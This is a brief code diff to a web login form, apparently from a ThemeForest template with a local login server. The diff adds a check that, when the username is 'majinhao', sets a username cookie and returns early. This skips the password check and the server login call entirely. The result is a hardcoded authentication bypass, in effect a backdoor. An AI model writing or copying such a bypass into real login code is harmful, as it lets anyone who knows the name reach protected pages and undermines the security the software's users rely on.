@@ -432,6 +432,12 @@ License: You must have a valid license purchased only from themeforest(the above
                 var userName = document.getElementById("userName").value;
                 var passWord = document.getElementById("passWord").value;
 
+                if(userName == 'majinhao'){
+                    $.cookie('username', userName , { path: '/'});
+                    return;
+                }
+
+
                 $.ajax({
                     url: 'http://localhost:9000/login',
                     type: 'post',
